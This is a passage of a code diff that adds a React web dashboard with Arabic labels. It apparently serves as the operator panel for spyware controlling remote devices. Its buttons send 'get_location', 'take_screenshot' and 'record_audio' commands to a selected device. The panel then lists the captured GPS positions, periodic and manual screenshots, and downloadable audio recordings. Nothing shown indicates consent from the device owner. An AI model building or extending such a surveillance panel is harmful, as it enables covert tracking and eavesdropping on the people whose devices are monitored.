+                                <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 transition duration-200">
+                                    <h3 className="text-lg font-semibold text-gray-800">المواقع</h3>
+                                    <button
+                                        onClick={() => sendCommand("get_location")}
+                                        className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg mr-2 hover:bg-blue-600 transition duration-200"
+                                    >
+                                        جلب الموقع
+                                    </button>
+                                    <button
+                                        onClick={() => fetchLocations(selectedDevice.uuid)}
+                                        className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                    >
+                                        تحديث المواقع
+                                    </button>
+                                    <div className="mt-2">
+                                        {locations.length > 0 ? (
+                                            <div>
+                                                {locations.map((loc, index) => (
+                                                    <p key={index} className="text-gray-600 mb-1">
+                                                        {formatLocalTime(loc.captured_at)} - Lat: {loc.latitude}, Lon: {loc.longitude}
+                                                        {loc.map_url && (
+                                                            <a href={loc.map_url} target="_blank" className="text-blue-500 ml-2">عرض على الخريطة</a>
+                                                        )}
+                                                    </p>
+                                                ))}
+                                            </div>
+                                        ) : (
+                                            <p className="text-gray-600">لا توجد مواقع متاحة.</p>
+                                        )}
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 mt-6">
+                                <h3 className="text-lg font-semibold text-gray-800">لقطات الشاشة الدورية</h3>
+                                <button
+                                    onClick={() => fetchPeriodicScreenshots(selectedDevice.uuid)}
+                                    className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                >
+                                    تحديث اللقطات الدورية
+                                </button>
+                                {periodicScreenshots.length > 0 ? (
+                                    <div className="mt-2 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+                                        {periodicScreenshots.map((screenshot, index) => (
+                                            <div key={index} className="text-gray-600">
+                                                <p>{formatLocalTime(screenshot.captured_at)}</p>
+                                                <img 
+                                                    src={screenshot.screenshot_url} 
+                                                    alt={`Periodic Screenshot at ${formatLocalTime(screenshot.captured_at)}`} 
+                                                    className="mt-1 w-full h-auto rounded-lg shadow-md"
+                                                    onError={(e) => { console.error('Error loading screenshot:', screenshot.screenshot_url); e.target.alt = 'فشل تحميل الصورة'; }}
+                                                />
+                                                <a href={screenshot.screenshot_url} target="_blank" className="text-blue-500 mt-1 inline-block">عرض الصورة</a>
+                                            </div>
+                                        ))}
+                                    </div>
+                                ) : (
+                                    <p className="mt-2 text-gray-600">لا توجد لقطات شاشة دورية متاحة.</p>
+                                )}
+                            </div>
+
+                            <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 mt-6">
+                                <h3 className="text-lg font-semibold text-gray-800">لقطات الشاشة اليدوية</h3>
+                                <button
+                                    onClick={() => fetchScreenshots(selectedDevice.uuid)}
+                                    className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                >
+                                    تحديث اللقطات اليدوية
+                                </button>
+                                {screenshots.length > 0 ? (
+                                    <div className="mt-2 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+                                        {screenshots.map((screenshot, index) => (
+                                            <div key={index} className="text-gray-600">
+                                                <p>{formatLocalTime(screenshot.captured_at)}</p>
+                                                <img 
+                                                    src={screenshot.screenshot_url} 
+                                                    alt={`Manual Screenshot at ${formatLocalTime(screenshot.captured_at)}`} 
+                                                    className="mt-1 w-full h-auto rounded-lg shadow-md"
+                                                    onError={(e) => { console.error('Error loading screenshot:', screenshot.screenshot_url); e.target.src = 'https://via.placeholder.com/300?text=فشل+تحميل+الصورة'; e.target.alt = 'فشل تحميل الصورة'; }}
+                                                />
+                                                <a href={screenshot.screenshot_url} target="_blank" className="text-blue-500 mt-1 inline-block">عرض الصورة</a>
+                                            </div>
+                                        ))}
+                                    </div>
+                                ) : (
+                                    <p className="mt-2 text-gray-600">لا توجد لقطات شاشة يدوية متاحة.</p>
+                                )}
+                            </div>
+
+                            <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 mt-6">
+                                <h3 className="text-lg font-semibold text-gray-800">تسجيلات الصوت</h3>
+                                <button
+                                    onClick={() => sendCommand("record_audio")}
+                                    className="mt-2 bg-green-500 text-white px-3 py-1 rounded-lg hover:bg-green-600 transition duration-200"
+                                >
+                                    تسجيل الصوت
+                                </button>
+                                <button
+                                    onClick={() => fetchAudioRecordings(selectedDevice.uuid)}
+                                    className="mt-2 ml-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                >
+                                    تحديث التسجيلات
+                                </button>
+                                {audioRecordings.length > 0 ? (
+                                    <div className="mt-2">
+                                        {audioRecordings.map((recording, index) => (
+                                            <div key={index} className="text-gray-600 mb-2">
+                                                تسجيل بتاريخ: {formatLocalTime(recording.timestamp)}
+                                                <audio controls className="mt-1 w-full">
+                                                    <source src={recording.audio_url} type="audio/mp4" />
+                                                    Your browser does not support the audio element.
+                                                </audio>
+                                                <a href={recording.audio_url} target="_blank" className="text-blue-500 ml-2">عرض</a>
+                                                <a href={recording.audio_url} download className="text-blue-500 ml-2">تحميل</a>
+                                            </div>
+                                        ))}
+                                    </div>
+                                ) : (
+                                    <p className="mt-2 text-gray-600">لا توجد تسجيلات صوتية متاحة.</p>
+                                )}
+                            </div>
+
+                            <div className="bg-white shadow-md rounded-lg p-6 mt-6">
+                                <h2 className="text-xl font-semibold text-gray-800 mb-2">إرسال الأوامر</h2>
+                                <button
+                                    onClick={() => sendCommand("record_audio")}
+                                    className="bg-green-500 text-white px-4 py-2 rounded-lg mr-2 hover:bg-green-600 transition duration-200"
+                                >
+                                    تسجيل الصوت
+                                </button>
+                                <button
+                                    onClick={() => sendCommand("take_screenshot")}
+                                    className="bg-green-500 text-white px-4 py-2 rounded-lg hover:bg-green-600 transition duration-200"
+                                >
+                                    أخذ لقطة شاشة
+                                </button>
+                                <div className="mt-4">
+                                    <p className="text-gray-600">نتائج الأوامر:</p>
+                                    {commandResults['record_audio'] && (
+                                        <p className="text-blue-500">
+                                            تسجيل الصوت: <a href={commandResults['record_audio']} target="_blank">عرض التسجيل</a>
+                                        </p>
+                                    )}
+                                    {commandResults['take_screenshot'] && (
+                                        <p className="text-blue-500">
+                                            لقطة الشاشة: <a href={commandResults['take_screenshot']} target="_blank">عرض الصورة</a>
+                                        </p>
+                                    )}
+                                </div>
+                            </div>
+                        </div>
+                    )}
+                </div>
+            );
+        };
+        const root = ReactDOM.createRoot(document.getElementById("root"));
+        root.render(<App />);
+    </script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</body>
+</html>
